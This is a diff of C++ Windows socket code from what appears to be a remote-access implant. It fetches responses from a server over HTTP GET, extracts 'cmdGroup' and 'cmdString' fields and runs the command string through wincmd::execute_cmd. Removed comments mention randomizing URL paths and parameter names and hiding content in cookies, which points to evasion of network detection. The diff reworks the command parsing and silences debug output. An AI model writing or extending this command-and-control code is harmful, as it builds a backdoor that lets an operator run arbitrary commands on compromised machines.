@@ -16,10 +16,8 @@
 namespace xhttp {
 std::vector<uint32_t> req_body;
 std::string cmdstr;
-std::string cmdValue;
-std::string cmd;
 std::string cmdString;
-std::string cmdResponse;
+std::string cmdValue;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -110,9 +108,7 @@ SOCKET create_socket(const std::string& host, int port) {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 /////////                                       GET  
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-// Randomize the URL path based on common path
-// Randomize the parameter names
-// Use cookies to send the content
+
 std::string http_get(const std::string& url) {
     std::string protocol, host, path, cookies;
     int port;
@@ -140,37 +136,36 @@ std::string http_get(const std::string& url) {
     }
 
     std::vector<char> response_data = receive_data(ConnectSocket);
+// Print response
+/*
     for (const auto& data : response_data) {
-        char character = static_cast<char>(data); // Convert ASCII value to character
+        char character = static_cast<char>(data); // Convert ASCII value to char
         std::cerr << character;
     }
     std::cerr << std::endl;
+*/
 
-    // Here you can process the response data as needed
-    // Process the response data using extractCMD
-    std::string cmdResponse = extractCMD(response_data);
-    req_body.clear(); // Clearing req_body vector
+    std::string cmdValue = extractCMD(response_data);
+    req_body.clear();
 
     closesocket(ConnectSocket);
     WSACleanup();
-    return ""; // Placeholder for response handling
+    return ""; 
 }
 
 std::string extractCMD(const std::vector<char>& data) {
-    // Search for the CMD header
-    const char cmdHeader[] = "CMD:";
+    const char cmdHeader[] = "cmdGroup:";
     auto header_start = std::search(data.begin(), data.end(), std::begin(cmdHeader), std::end(cmdHeader) - 1);
     auto header_end = std::find(header_start, data.end(), '\n');
-    const char cmda[] = "CMD_ARG:";
+    const char cmda[] = "cmdString:";
     auto argstart = std::search(data.begin(), data.end(), std::begin(cmda), std::end(cmda) - 1);
     auto argend = std::find(argstart, data.end(), '\n');
     
-    cmdResponse.assign(header_start + sizeof(cmdHeader) - 1, header_end);
+    cmdValue.assign(header_start + sizeof(cmdHeader) - 1, header_end);
     cmdString.assign(argstart + sizeof(cmda) - 1, argend);
 
-    std::cerr << "CMD: " << cmdResponse << std::endl; 
-    std::cerr << "CMD String: " << cmdString << std::endl; 
-    return cmdResponse;
+
+    return cmdValue;
 }
 
 bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
@@ -228,17 +223,15 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
         }
     } while (bytesReceived == BUFFER_SIZE);
 
-    std::string cmd = extractCMD(buffer);
+//    std::cerr << "CMD: " << cmdValue << std::endl; 
+//    std::cerr << "CMD String: " << cmdString << std::endl; 
 
-    if (!cmd.empty()) {
-        command::parseCmd(cmdString, command::hStdInWr);
+    if (cmdString != "aaa") {
+        wincmd::execute_cmd(cmdString, wincmd::current_dir, wincmd::out_put, wincmd::time_out); //  
     } else {
         std::cerr << "Received empty command" << std::endl;
     }
-    for (char c : buffer) {
-        std::cout << c;
-    }
-    std::cout << std::endl;
+
     return buffer;
 }
 
